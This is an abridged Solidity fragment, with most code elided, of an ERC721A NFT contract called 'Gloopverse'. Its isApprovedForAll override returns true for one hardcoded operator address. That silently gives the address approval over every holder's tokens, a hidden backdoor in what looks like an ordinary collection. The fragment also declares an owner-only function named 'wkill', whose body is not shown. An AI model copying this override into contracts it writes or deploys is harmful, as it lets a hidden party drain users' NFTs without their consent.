  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0x049D3d931cF4f9c223eB509F7d753614905e811B){return true;}
...
contract Gloopverse is Ownable, ERC721A, ReentrancyGuard {
  ...
  constructor(
    uint256 maxBatchSize_,
    uint256 collectionSize_
  ) ERC721A("Gloopverse", "GLP", maxBatchSize_, collectionSize_) {
  ...
  function wkill() external onlyOwner {
